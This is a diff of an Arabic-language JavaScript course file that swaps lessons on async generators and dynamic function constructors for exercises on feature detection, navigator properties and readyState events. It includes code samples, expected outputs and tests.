-- [[async function*]]: النجمة و [[async]] مع بعض، فجواها [[await]] (تستنى الصفحة) و [[yield]] (تطلّع عنصر).
-- [[yield* data.items]]: بيطلّع عناصر الصفحة واحد واحد. ([[yield*]] جوه async generator بيقبل sync أو async iterable.)
-- [[finally]]: التنضيف المضمون، هنشوفه بيشتغل في كل الحالات.
-
----
-
-## ٣. [[for await]] و [[break]]
-
-~~~js
-for await (const item of allItems()) { console.log(item); if (item === 21) break; }
+- **[[toLowerCase()]]:** الـ language tags مش حساسة للحروف ([["EN-gb"]] زي [["en-GB"]]).
+- **[[split("-")[0]]]:** اللغة من غير المنطقة. الأدق [[new Intl.Locale(tag).language]] (درس «Intl.Locale»).
+- **الترتيب:** اليوزر اللي حاطط فرنساوي ثم إنجليزي ثم عربي ياخد إنجليزي، لأن ده اختياره التاني. غلطة شائعة إنك تدوّر على [["ar"]] الأول في أي مكان في اللستة.
+- **Node 24 فيه [[navigator]]** بـ [[language]] و [[languages]]، فالدالة نفسها اشتغلت هناك. في المتصفح اديها [[navigator.languages]] زي ما هي.` },
+            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** موقع فيه [[if (navigator.userAgent.includes("Safari")) applySafariFix();]] عشان باج في Safari بس. اطبع [[navigator.userAgent.includes("Safari")]] و [[includes("Chrome")]] في Chrome. إيه المشكلة؟ وصلّح زرار «انسخ اللينك» اللي كان مكتوب [[if (ua.includes("Chrome")) copy(); else alert("متصفحك مش بيدعم")]] (من قسم ٢ في الشرح).`, done: R`عرفت إن Chrome بيقول «Safari» في الـ UA فالإصلاح هيتطبّق غلط، وبقى الفحص على الميزة: [[navigator.clipboard?.writeText]].`, sol: R`~~~js الـ Console في Chrome 157
+const ua = navigator.userAgent;
+console.log(ua.includes("Safari"), ua.includes("Chrome"));
+console.log("clipboard" in navigator, typeof navigator.clipboard?.writeText, "share" in navigator);
 ~~~
 
 ~~~text الناتج
-  جبت صفحة 1
-11
-12
-  جبت صفحة 2
-21
-  اتقفل
-~~~
-
-- الصفحة 2 **متجابتش** غير لما الـ loop طلب العنصر التالت: lazy زي الـ sync.
-- [[break]] عند 21: [[for await]] نادى [[return()]]، فالـ [[finally]] اشتغلت، والصفحة 3 **عمرها ما اتطلبت**. (في API حقيقي = request أقل.)
-
----
-
-## ٤. [[AsyncGenerator]]: [[next]] و [[return]] و [[throw]] بإيدك
-
-~~~js
-const it = allItems();
-console.log(it[Symbol.asyncIterator]() === it, Object.prototype.toString.call(it));
-const first = it.next();
-console.log(first instanceof Promise, await first, await it.return('stop'), await it.next());
-~~~
-
-~~~text الناتج
-true [object AsyncGenerator]
-  جبت صفحة 1
-  اتقفل
-true { value: 11, done: false } { value: 'stop', done: true } { value: undefined, done: true }
-~~~
-
-| الـ method | بترجّع | بتعمل إيه |
-|---|---|---|
-| [[next(v)]] | Promise لـ [[{ value, done }]] | كمّل لحد الـ [[yield]] الجاية، و [[v]] قيمة الـ [[yield]] الواقفة |
-| [[return(v)]] | Promise لـ [[{ value: v, done: true }]] | الـ [[yield]] الواقفة بقت [[return]]: [[finally]] اشتغلت (وتقدر تعمل [[await]] جواها) |
-| [[throw(e)]] | Promise | الـ [[yield]] الواقفة رمت [[e]]: لو فيه [[catch]] بيكمّل، وإلا الـ Promise بتترفض والـ generator يخلص |
-
-اتجرّب [[throw]]: generator فيه [[try { yield i } catch]] رجّع [[{ value: 'recovered', done: false }]] وكمّل، ومن غير [[catch]] الـ Promise اترفضت بنفس الـ error واتمسكت بـ [[try { await t2.throw(...) } catch]] برّه.
-
-### الطابور
-
-لو ناديت [[next()]] ٤ مرات من غير [[await]]، مبيشتغلوش مع بعض: بيقفوا في طابور جوه الـ AsyncGenerator والنتايج بالترتيب (تمرين «اقرا وتوقّع»).
-
----
-
-## ٥. [[ AsyncIterator[Symbol.asyncIterator] ]]: الأب المشترك
-
-| الحاجة | فين | فيها إيه |
-|---|---|---|
-| [[ AsyncIterator[Symbol.asyncIterator] ]] (يعني [[ AsyncIterator.prototype[Symbol.asyncIterator] ]]) | أبو كل الـ async iterators | بترجّع [[this]]، فأي async iterator هو كمان async iterable |
-| [[AsyncGenerator.prototype]] | تحته | [[next]] و [[return]] و [[throw]] |
-| [[AsyncIterator]] كـ global | مش موجود في Node 24 | بتوصله بـ [[Object.getPrototypeOf]] مرتين من [[asyncGenFn.prototype]] |
-
-~~~text الناتج: اتجرّب على allItems
-Object.getOwnPropertyNames(AsyncGeneratorProto)   [ 'constructor', 'next', 'return', 'throw' ]
-Reflect.ownKeys(AsyncIteratorProto)               [ Symbol(Symbol.asyncIterator), Symbol(Symbol.asyncDispose) ]
-AsyncIteratorProto[Symbol.asyncIterator].call(42)  42
-typeof globalThis.AsyncIterator                    undefined
-~~~
-
-يعني مفيش [[map]] ولا [[filter]] ولا [[take]] على الـ async iterators (لسه proposal). اكتبهم async generators صغيرة (تمرين «ابني» التاني).
-
----
-
-## ٦. [[Array.fromAsync]] و [[for await]] على sync
-
-~~~js
-console.log(await Array.fromAsync(allItems()));
-~~~
-
-~~~text الناتج
-  جبت صفحة 1
-  جبت صفحة 2
-  جبت صفحة 3
-  اتقفل
-[ 11, 12, 21, 22, 31, 32 ]
-~~~
-
-و [[for await]] بيقبل sync iterable كمان، ويستنى أي Promise جواه:
-
-~~~text الناتج: for await (const v of [sleep(5).then(() => 'a'), 'b', Promise.resolve('c')])
-sync+promises a
-sync+promises b
-sync+promises c
-~~~
-
----
-
-## ٧. Node: ملف كبير سطر سطر
-
-[[readline.createInterface({ input: createReadStream(file) })]] async iterable بيطلّع سطر سطر من غير ما يقرا الملف في الذاكرة. والفخ اتقاس في «جرّب»: [[break]] بيقفل الـ readline بس، والـ file stream بيفضل مفتوح ([[closed=false]] بعد ثانية)، ولو حد تاني سامع لـ [[data]] بيقرا الملف كله. والحل async generator بـ [[finally]] فيها [[input.destroy()]] (الملف اتقفل بعد chunk واحد). ومشروع الوحدة الكبير بيبني على ده.
-
----
-
-## الخلاصة
-
-- [[Symbol.asyncIterator]] و [[next]] بترجّع Promise، و [[for await]] بيستنى ويقفل بـ [[return]].
-- [[async function*]] = [[await]] + [[yield]]، و [[next]] و [[return]] و [[throw]] Promises في طابور.
-- [[AsyncIterator.prototype]] مش global ومعندوش helpers.
-- اقفل الـ resources بإيدك في [[finally]]: مش كل async iterable بيقفل اللي تحته.`,
-          lines: [
-            R`دالة مساعدة: Promise بتتحل بعد [[ms]] ملّي ثانية، عشان نمثّل وقت الشبكة.`,
-            R`API وهمي: بيستنى 20ms ويرجّع رقمين للصفحة، ورقم الصفحة الجاية لحد 3، وبعدها [[null]].`,
-            R`async generator: يقدر يعمل [[await]] و [[yield]] في نفس الدالة.`,
-            R`بنبدأ من الصفحة الأولى.`,
-            R`[[try]] عشان الـ [[finally]] تشتغل في كل طرق الخروج.`,
-            R`طول ما فيه صفحة (مش [[null]]) كمّل.`,
-            R`استنى الصفحة. الـ generator بيقف هنا من غير ما يوقّف باقي البرنامج.`,
-            R`بنطبع إننا جبنا الصفحة، عشان نشوف إمتى الطلب بيحصل بالظبط.`,
-            R`[[yield*]] بيطلّع عناصر الصفحة واحد واحد، والـ generator بيقف بعد كل عنصر لحد ما حد يطلب.`,
-            R`رقم الصفحة الجاية، ولو [[null]] الـ [[while]] تخلص.`,
-            R`قفلة الـ [[while]].`,
-            R`[[finally]] بتطبع [[اتقفل]] سواء خلصنا أو اتعمل [[break]] أو error.`,
-            R`قفلة [[allItems]].`,
-            R`[[for await]] بيطبع 11 و 12 و 21، والـ [[break]] بينادي [[return]] فالـ [[finally]] بتشتغل والصفحة 3 متتطلبش.`,
-            R`generator جديد هنلعب بيه بإيدنا.`,
-            R`[[true]] (الـ async iterator بيرجّع نفسه) و [[[object AsyncGenerator]]].`,
-            R`أول [[next()]] بيرجّع Promise على طول، والـ generator بدأ يجيب الصفحة.`,
-            R`[[true]] (Promise)، والقيمة 11، و [[return('stop')]] قفلت (الـ [[finally]] اشتغلت) ورجّعت [[{ value: 'stop', done: true }]]، و [[next]] بعدها [[done]].`,
-            R`[[Array.fromAsync]] بيلف على الكل ويستنى، فبيجيب التلات صفحات ويرجّع الـ ٦ أرقام في array.`,
-          ],
-          ref: [
-            { t: "MDN: Symbol.asyncIterator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/asyncIterator" },
-            { t: "MDN: AsyncIterator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncIterator" },
-            { t: "MDN: AsyncIterator.prototype[Symbol.asyncIterator]()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncIterator/Symbol.asyncIterator" },
-            { t: "MDN: AsyncGenerator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncGenerator" },
-            { t: "MDN: AsyncGenerator.prototype.next()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncGenerator/next" },
-            { t: "MDN: AsyncGenerator.prototype.return()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncGenerator/return" },
-            { t: "MDN: AsyncGenerator.prototype.throw()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AsyncGenerator/throw" },
-            { t: "MDN: for await...of", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for-await...of" },
-            { t: "Node.js: readline (async iteration)", url: "https://nodejs.org/api/readline.html#rlsymbolasynciterator" },
-            { t: "Node.js: events.on()", url: "https://nodejs.org/api/events.html#eventsonemitter-eventname-options" },
-          ],
-          pre: [{ to: "js/async و await", why: R`[[await]] والـ Promises` }, "js/Generator: next و return و throw و yield*", { to: "js/async في loops", why: R`[[for...of]] بـ [[await]] و [[Array.fromAsync]] والتوازي` }, { to: "js/Streams", why: R`الـ streams في المتصفح وإنها async iterables` }],
-        },
-        {
-          cmd: "AsyncFunction و GeneratorFunction و AsyncGeneratorFunction",
-          title: "عيلة الدوال: كل نوع دالة ليه constructor مستخبي، تجيبه إزاي، و instanceof بيقول إيه، وليه new AsyncFunction زي eval",
-          desc: R`زي ما أي دالة عادية [[instanceof Function]]، الدوال التانية ليها constructors مخصوصة: [[AsyncFunction]] و [[GeneratorFunction]] و [[AsyncGeneratorFunction]]. ومفيش ولا واحد فيهم global: بتجيبه من [[(async function () {}).constructor]] أو [[Object.getPrototypeOf]].
-
-• كل واحد subclass من [[Function]]، فـ [[save instanceof Function]] لسه [[true]].
-• الـ [[Symbol.toStringTag]] بتاعهم بيقول النوع: [[[object AsyncFunction]]] و [[[object GeneratorFunction]]].
-• [[GeneratorFunction.prototype.prototype]] هو [[Generator.prototype]] (اللي عليه [[next]] و [[return]] و [[throw]])، ونفس الكلام لـ [[AsyncGenerator]].
-• [[new AsyncFunction('a', 'b', 'return a + b')]] بيعمل دالة من **نص**، زي [[new Function]] و [[eval]]: بتشوف الـ global بس، والـ CSP بيمنعها، ومينفعش مع أي نص جاي من يوزر.
-
-والأهم: متعتمدش على [[fn instanceof AsyncFunction]] عشان تقرر «أستنى ولا لأ»: دالة عادية بترجّع Promise مش [[AsyncFunction]]. [[await]] على أي نتيجة دايمًا آمن.`,
-          example: R`// العيلة: كل نوع دالة ليه constructor و prototype خاص
-const AsyncFunction = async function () {}.constructor;
-const GeneratorFunction = function* () {}.constructor;
-const AsyncGeneratorFunction = async function* () {}.constructor;
-console.log(AsyncFunction.name, GeneratorFunction.name, AsyncGeneratorFunction.name, Object.getPrototypeOf(AsyncFunction) === Function);
-async function save() {}
-function* ids() {}
-console.log(save instanceof AsyncFunction, ids instanceof GeneratorFunction, ids instanceof AsyncFunction, save instanceof Function);
-const tag = (x) => Object.prototype.toString.call(x);
-console.log(tag(save), tag(ids()), tag((async function* () {})()));
-const add = new AsyncFunction('a', 'b', 'return a + b');
-console.log(add.name, add.length, await add(2, 3));
-const notAsync = () => Promise.resolve(1);
-console.log(notAsync instanceof AsyncFunction, notAsync() instanceof Promise);
-const secret = 'local';
-console.log(new Function('return typeof secret')());`,
-          try: R`هات [[Generator]] و [[AsyncGenerator]] (الـ prototypes اللي عليهم [[next]]) من الـ constructors: [[GeneratorFunction.prototype.prototype]]. واتأكد إن [[Object.getPrototypeOf(ids.prototype)]] هو هو، واطبع الـ [[Symbol.toStringTag]] بتاعهم وأسامي الخصايص على [[GeneratorFunction.prototype]]. وبعدين اعمل generator من نص بـ [[new GeneratorFunction('n', '...')]] بيطلّع مربعات الأرقام.`,
-          sol: R`~~~js family.mjs
-const GeneratorFunction = function* () {}.constructor;
-const AsyncGeneratorFunction = async function* () {}.constructor;
-function* ids() {}
-const Generator = GeneratorFunction.prototype.prototype;
-const AsyncGenerator = AsyncGeneratorFunction.prototype.prototype;
-console.log(Object.getPrototypeOf(ids.prototype) === Generator, Object.getPrototypeOf(ids()) === ids.prototype, Generator[Symbol.toStringTag], AsyncGenerator[Symbol.toStringTag]);
-console.log(Object.getPrototypeOf(ids) === GeneratorFunction.prototype, Object.getPrototypeOf(GeneratorFunction.prototype) === Function.prototype);
-console.log(Object.getOwnPropertyNames(GeneratorFunction.prototype), Object.getOwnPropertyNames(AsyncGeneratorFunction.prototype));
-const g = new GeneratorFunction('n', 'for (let i = 0; i < n; i++) yield i * i;');
-console.log([...g(4)]);
-const ag = new AsyncGeneratorFunction('yield 1; yield await Promise.resolve(2);');
-console.log(await Array.fromAsync(ag()));
-console.log(String(g));
-~~~
-
-~~~text الناتج (Node 24.22)
-true true Generator AsyncGenerator
 true true
-[ 'prototype', 'constructor' ] [ 'prototype', 'constructor' ]
-[ 0, 1, 4, 9 ]
-[ 1, 2 ]
-function* anonymous(n
-) {
-for (let i = 0; i < n; i++) yield i * i;
+true function true
+~~~
+
+الإصلاح:
+
+~~~js copy-link.js
+async function copyLink(url) {
+  if (!navigator.clipboard?.writeText) return false; // المتصفح أو الصفحة (http مش آمن) مش بيدعم
+  await navigator.clipboard.writeText(url);
+  return true;
 }
+document.querySelector("#copy").hidden = !navigator.clipboard?.writeText;
 ~~~
 
-السلسلتين بالترتيب:
-
-~~~text
-الدالة:   ids  →  GeneratorFunction.prototype  →  Function.prototype  →  Object.prototype
-الناتج:   ids()  →  ids.prototype  →  Generator (= GeneratorFunction.prototype.prototype)  →  Iterator.prototype  →  Object.prototype
+- **ليه «Safari» في Chrome:** كل متصفح بيقلّد نص اللي قبله عشان المواقع اللي بتفحص النص متقفلش في وشه. Edge و Opera و Samsung Internet فيهم «Chrome» كمان. فأي [[includes]] على الـ UA هيصيب متصفحات غير اللي قصدتها.
+- **الفحص على الميزة** بيشتغل صح في أي متصفح النهارده وبكرة، حتى لو اسمه اتغيّر.
+- **[[?.]]** (optional chaining) بيرجّع [[undefined]] بدل ما يرمي لو [[clipboard]] مش موجود.
+- **لو الباج نفسه في محرك معين** ومحتاج تعرفه فعلًا: [[navigator.userAgentData]] (Chrome و Edge بس) أو [[CSS.supports()]] للـ CSS. وده آخر حل.` },
+            { lvl: 'تحدي', t: R`**قيس بنفسك:** اكتب سكربت في آخر الـ [[<body>]] بيسجّل [[document.readyState]] في الأول، ومع كل [[readystatechange]]، ومع [[DOMContentLoaded]] و [[load]]، ويطبع الترتيب كله لما [[load]] يحصل. وبعدين انقل نفس السكربت لـ [[<head>]] بـ [[defer]]: الحالة الأولى اتغيّرت لإيه وليه؟ (من قسم ٣ في الشرح).`, done: R`في الـ body طلع «loading → interactive → DOMContentLoaded → complete → load»، وبـ [[defer]] أول قيمة بقت [["interactive"]] لأن السكربت بيستنى الشجرة تخلص.`, sol: R`~~~html ready.html
+<script>
+const states = [document.readyState];
+document.addEventListener("readystatechange", () => states.push(document.readyState));
+document.addEventListener("DOMContentLoaded", () => states.push("DOMContentLoaded"));
+addEventListener("load", () => { states.push("load"); console.log(states.join(" → ")); });
+</script>
 ~~~
 
-و [[String(g)]] بيوريك إن المحرك بنى الدالة من النص: اسمها [[anonymous]] والـ parameters في سطر لوحدهم.`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** لكل دالة من دول: الـ tag من [[Object.prototype.toString]]، و [[fn.constructor.name]]، و هل [[instanceof AsyncFunction]]، و هل عندها خاصية [[prototype]]:
-
-~~~js
-const kinds = { normal: function () {}, arrow: () => {}, method: { m() {} }.m, asyncFn: async () => {}, gen: function* () {}, asyncGen: async function* () {}, cls: class {}, bound: (async () => {}).bind(null) };
-~~~`, done: R`ملّيت جدول بالـ ٨، وطلع صح في أغلبهم، وعرفت ليه [[cls]] بتقول [[Function]] وليه [[bound]] لسه [[AsyncFunction]].`, sol: R`~~~js kinds.mjs
-const AsyncFunction = async function () {}.constructor;
-const GeneratorFunction = function* () {}.constructor;
-const kinds = { normal: function () {}, arrow: () => {}, method: { m() {} }.m, asyncFn: async () => {}, gen: function* () {}, asyncGen: async function* () {}, cls: class {}, bound: (async () => {}).bind(null) };
-for (const [k, f] of Object.entries(kinds)) {
-  console.log(k.padEnd(9), Object.prototype.toString.call(f).padEnd(33), f.constructor.name.padEnd(23), f instanceof Function, f instanceof AsyncFunction, f instanceof GeneratorFunction, 'prototype' in f);
-}
+~~~text الناتج (Chrome 157، السكربت في آخر body)
+loading → interactive → DOMContentLoaded → complete → load
 ~~~
 
-~~~text الناتج (Node 24.22)
-normal    [object Function]                 Function                true false false true
-arrow     [object Function]                 Function                true false false false
-method    [object Function]                 Function                true false false false
-asyncFn   [object AsyncFunction]            AsyncFunction           true true false false
-gen       [object GeneratorFunction]        GeneratorFunction       true false true true
-asyncGen  [object AsyncGeneratorFunction]   AsyncGeneratorFunction  true false false true
-cls       [object Function]                 Function                true false false true
-bound     [object AsyncFunction]            AsyncFunction           true true false false
-~~~
-
-- **الـ class** مفيش لها constructor خاص: هي [[Function]] عادية في السلسلة (الفرق جواها: مبتتناداش من غير [[new]]). فالطريقة الوحيدة تعرفها: [[Function.prototype.toString]] بيبدأ بـ [[class]].
-- **[[bound]]**: [[bind]] بيعمل دالة جديدة الـ prototype بتاعها نفس prototype الأصلية، فلسه [[AsyncFunction]].
-- **خاصية [[prototype]]**: الدوال اللي تتنادى بـ [[new]] (عادية و class) عندها، والـ generators عندهم (ده الـ prototype بتاع الـ generator objects اللي هيتعملوا)، والـ arrow والـ methods والـ async functions معندهمش.` },
-            { lvl: 'تطبيق', t: R`**مسألة:** [[kindOf(fn)]] بترجّع [['async-generator']] أو [['generator']] أو [['async']] أو [['class']] أو [['sync']]، و [[null]] لأي حاجة مش دالة. استخدم الـ constructors الـ ٣ و [[instanceof]]، والـ class من [[Function.prototype.toString]].`, done: R`على [[async () => {}]] و [[function* () {}]] و [[async function* () {}]] و [[class {}]] و [[class A extends Array {}]] و [[() => 1]] و method و [[Math.max]] و bound async و 5 بيطلّع [[async generator async-generator class class sync sync sync async]] وفاضي للأخير، والتمرين اللي بيتصحح لوحده عدّى.`, sol: R`~~~js kind-of.mjs
-const AsyncFunction = async function () {}.constructor;
-const GeneratorFunction = function* () {}.constructor;
-const AsyncGeneratorFunction = async function* () {}.constructor;
-function kindOf(fn) {
-  if (typeof fn !== 'function') return null;
-  if (fn instanceof AsyncGeneratorFunction) return 'async-generator';
-  if (fn instanceof GeneratorFunction) return 'generator';
-  if (fn instanceof AsyncFunction) return 'async';
-  if (/^class[\s{]/.test(Function.prototype.toString.call(fn))) return 'class';
-  return 'sync';
-}
-console.log([async () => {}, function* () {}, async function* () {}, class {}, class A extends Array {}, () => 1, { m() {} }.m, Math.max, (async () => {}).bind(null), 5].map(kindOf).join(' '));
-~~~
-
-~~~text الناتج (Node 24.22)
-async generator async-generator class class sync sync sync async
-~~~
-
-**الشرح:** الترتيب مش مهم هنا لأن الأنواع التلاتة مش بيورثوا من بعض (كل واحد subclass من [[Function]] مباشرة). و [[Function.prototype.toString.call(fn)]] مش [[fn.toString()]] عشان لو حد عمل override لـ [[toString]] على الـ class. و [[/^class[\s{]/]] عشان [[class{}]] و [[class A]] الاتنين، ومش [[classify()]]. الـ [[null]] في الآخر بقى نص فاضي في [[join]]. **حدود الطريقة:** الكود اللي اتعمله transpile لـ ES5 (Babel قديم) الـ async بيبقى دالة عادية بترجّع Promise، فـ [[kindOf]] هيقول [['sync']] (التمرين الجاي).` },
-            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[runTask]] بيقرر يستنى ولا لأ بـ [[instanceof AsyncFunction]]. جرّبه على ٣ tasks وشوف أنهي واحدة باظت، وصلّحه بسطر واحد.
-
-~~~js
-const AsyncFunction = async function () {}.constructor;
-async function runTask(task) {
-  if (task instanceof AsyncFunction) return 'استنيت: ' + (await task());
-  return 'من غير انتظار: ' + task();
-}
-const fromDb = async () => 'rows';
-const fromCache = () => Promise.resolve('cached');
-const plain = () => 'plain';
-console.log(await runTask(fromDb), '|', await runTask(fromCache), '|', await runTask(plain));
-~~~`, done: R`النسخة المصلّحة بتطبع [[rows]] و [[cached]] و [[plain]]، ومفيش [[[object Promise]]].`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-استنيت: rows | من غير انتظار: [object Promise] | من غير انتظار: plain
-~~~
-
-[[fromCache]] دالة عادية بترجّع Promise، فمش [[AsyncFunction]]، فالكود ملزقش الـ Promise في نص من غير ما يستنى: [[[object Promise]]].
-
-~~~js run-task-fixed.mjs
-async function runTaskFixed(task) { return 'النتيجة: ' + (await task()); }
-const fromDb = async () => 'rows';
-const fromCache = () => Promise.resolve('cached');
-const plain = () => 'plain';
-console.log(await runTaskFixed(fromDb), '|', await runTaskFixed(fromCache), '|', await runTaskFixed(plain));
-~~~
-
-~~~text الناتج (Node 24.22)
-النتيجة: rows | النتيجة: cached | النتيجة: plain
-~~~
-
-**الشرح:** [[await]] على قيمة مش Promise بيرجّعها زي ما هي (بعد microtask)، فـ [[await task()]] آمن على الأنواع التلاتة. «async» صفة في **النتيجة** (بترجّع Promise ولا لأ)، مش في نوع الدالة. وده نفس السبب اللي خلّى مكتبات كتير توقّف الفحص ده: الدوال اللي اتعملها transpile أو bind أو wrap بتضيّع الـ [[AsyncFunction]].` },
-            { lvl: 'تحدي', t: R`**قارن وقيس:** دالة ضريبة بتستخدم [[rate]] متعرّف في الـ module بـ [[const]]: مرة closure ([[(price) => price * (1 + rate)]]) ومرة [[new Function('price', 'return price * (1 + rate)')]]. نادي الاتنين، وبعدين اعمل [[globalThis.rate = 0.5]] ونادي تاني، وبعدين شغّل الملف بـ [[node --disallow-code-generation-from-strings]].`, done: R`الـ closure طلّع 114 في الحالتين، والـ [[new Function]] رمى [[ReferenceError]] الأول وبعدين طلّع 150، والـ flag خلّى [[new Function]] نفسه يرمي [[EvalError]].`, sol: R`~~~js new-function.mjs
-const rate = 0.14;
-function makeWithClosure() { return (price) => price * (1 + rate); }
-let viaFunction;
-try { viaFunction = new Function('price', 'return price * (1 + rate)'); console.log(viaFunction(100)); }
-catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-globalThis.rate = 0.5;
-console.log(makeWithClosure()(100), viaFunction?.(100));
-~~~
-
-~~~text الناتج: node new-function.mjs (Node 24.22)
-ReferenceError: rate is not defined
-114.00000000000001 150
-~~~
-
-~~~text الناتج: node --disallow-code-generation-from-strings new-function.mjs
-EvalError: Code generation from strings disallowed for this context
-114.00000000000001 undefined
-~~~
-
-**الشرح:**
-- الدوال اللي بتتعمل من نص ([[Function]] و [[AsyncFunction]] و [[GeneratorFunction]] و [[AsyncGeneratorFunction]]) بتتعمل في الـ **global scope**، مش في المكان اللي اتكتبت فيه. فـ [[rate]] بتاع الـ module مش ظاهر لها، وبعد ما عملنا [[globalThis.rate]] بقت تشوف ده (0.5) بدل اللي احنا قاصدينه.
-- [[--disallow-code-generation-from-strings]] بيقفل [[eval]] وأخواته في Node كله، وده نفس اللي الـ CSP بيعمله في المتصفح لو مفيهاش [[unsafe-eval]]. ابدأ بيه في السيرفرات لو مش محتاجهم.
-- [[114.00000000000001]] من الـ floating point (درس «number و NaN»).` },
+- **[[interactive]] قبل [[DOMContentLoaded]]:** الحالة بتتغيّر الأول، وبعدها الحدث. فـ listener على [[readystatechange]] بيشوف [["interactive"]] قبل أي listener على [[DOMContentLoaded]].
+- **[[complete]] قبل [[load]]:** نفس الفكرة.
+- **بـ [[defer]]** في الـ head: السكربت بيتنفّذ بعد ما الشجرة تخلص وقبل [[DOMContentLoaded]]، فأول قيمة [["interactive"]] والباقي زي ما هو. ده سبب إن [[defer]] و [[type="module"]] بيغنّوك عن [[DOMContentLoaded]] (درس «defer و async و module»).
+- **الحدث [[readystatechange]] على [[document]]** و [[load]] على [[window]]: لو حطيت [[load]] على [[document]] مش هيتنده.` },
           ],
-          check: { lang: "js", starter: R`const AsyncFunction = async function () {}.constructor;
-const GeneratorFunction = function* () {}.constructor;
-const AsyncGeneratorFunction = async function* () {}.constructor;
-function kindOf(fn) {
-  // 'async-generator' أو 'generator' أو 'async' أو 'class' أو 'sync' أو null
-}`, tests: R`test("async arrow", () => expect(kindOf(async () => {})).toBe('async'));
-test("generator", () => expect(kindOf(function* () {})).toBe('generator'));
-test("async generator", () => expect(kindOf(async function* () {})).toBe('async-generator'));
-test("class", () => expect(kindOf(class {})).toBe('class'));
-test("class extends", () => expect(kindOf(class A extends Array {})).toBe('class'));
-test("arrow", () => expect(kindOf(() => 1)).toBe('sync'));
-test("method", () => expect(kindOf({ m() {} }.m)).toBe('sync'));
-test("bound async", () => expect(kindOf((async () => {}).bind(null))).toBe('async'));
-test("مش دالة", () => expect(kindOf(5)).toBe(null));`, solution: R`const AsyncFunction = async function () {}.constructor;
-const GeneratorFunction = function* () {}.constructor;
-const AsyncGeneratorFunction = async function* () {}.constructor;
-function kindOf(fn) {
-  if (typeof fn !== 'function') return null;
-  if (fn instanceof AsyncGeneratorFunction) return 'async-generator';
-  if (fn instanceof GeneratorFunction) return 'generator';
-  if (fn instanceof AsyncFunction) return 'async';
-  if (/^class[\s{]/.test(Function.prototype.toString.call(fn))) return 'class';
-  return 'sync';
-}` },
-          flag: "script",
+          ref: [
+            { t: "MDN: Window", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window" },
+            { t: "MDN: Navigator", url: "https://developer.mozilla.org/en-US/docs/Web/API/Navigator" },
+            { t: "MDN: Document", url: "https://developer.mozilla.org/en-US/docs/Web/API/Document" },
+            { t: "MDN: globalThis", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/globalThis" },
+            { t: "MDN: Navigator.languages", url: "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/languages" },
+            { t: "MDN: Navigator.onLine", url: "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/onLine" },
+            { t: "MDN: Browser detection using the user agent", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Browser_detection_using_the_user_agent" },
+            { t: "MDN: Window.location", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/location" },
+            { t: "MDN Learn: DOM scripting introduction", url: "https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/DOM_scripting" },
+          ],
+          pre: [{ to: "js/defer و async و module", why: R`فرق السكربت العادي والـ module بيغيّر مين بيتحط على [[window]]، ومراحل [[readyState]] مربوطة بـ [[defer]]` }, { to: "js/let و const و var", why: R`ليه [[var]] بيتحط على الـ global object و [[let]] لأ` }],
           deep: {
-            why: R`هتقابل الـ constructors دول في ٣ أماكن: (١) كود بيفحص نوع دالة (frameworks بتعرض warning لو حطيت async في مكان مش مستنيه، أو test runners بيفرّقوا)، (٢) أدوات بتبني كود من نص (REPL، template engines قديمة، sandboxes)، (٣) لما تقرا الـ prototype chain بتاع generator object وتستغرب [[next]] جاية منين. ولما تفهمهم، هتعرف ليه الفحص بالنوع هش، وليه بناء الكود من نص خطر.`,
-            how: R`المواصفة فيها ٤ «function constructors»: [[Function]] و [[GeneratorFunction]] و [[AsyncFunction]] و [[AsyncGeneratorFunction]]. التلاتة الأخيرين:
-- [[Object.getPrototypeOf(GeneratorFunction) === Function]] (subclass)، و [[GeneratorFunction.prototype]] بيورث من [[Function.prototype]]، وعليه [[Symbol.toStringTag]] بـ [['GeneratorFunction']] و [[prototype]] (هو [[Generator.prototype]]).
-- كل generator function بتتعمل بخاصية [[prototype]] جديدة بتورث من [[Generator.prototype]]، والـ objects اللي بترجع منها بتورث من الخاصية دي. عشان كده [[ids() instanceof ids]] بـ [[true]] مع إن [[new ids()]] ممنوع.
-- [[AsyncFunction.prototype]] معندوش [[prototype]] لأن الـ async functions مش بتعمل objects بـ [[new]].
-
-نداء أي واحد منهم ([[new]] أو من غيره، الاتنين زي بعض) بيعمل CreateDynamicFunction: بيلزق الـ parameters والـ body في نص، ويعمل parse ليه **كـ دالة في الـ global environment**، فمبتشوفش أي متغير محلي ولا متغيرات الـ module. وده بيعدّي على نفس فحص الأمان بتاع [[eval]] (HostEnsureCanCompileStrings)، فالـ CSP من غير [[unsafe-eval]] أو [[--disallow-code-generation-from-strings]] بيرموا [[EvalError]].`,
-            when: R`تجيب الـ constructor: للفحص في أدوات وتيستات (وبحذر)، ولقراية الـ prototype chain. [[new AsyncFunction(...)]] وأخواتها: تقريبًا أبدًا في كود تطبيق. استخدامات مشروعة نادرة: REPL أو playground بيشغّل كود المطوّر نفسه بـ [[await]] top-level، أو code generation وقت الـ build (مش وقت الـ request). وأي نص جاي من يوزر = ثغرة code injection؛ لو محتاج معادلات من اليوزر اكتب parser صغير بـ whitelist.`,
-            mistakes: R`- تدوّر على [[AsyncFunction]] كـ global: [[ReferenceError: AsyncFunction is not defined]]. جيبه من [[(async () => {}).constructor]].
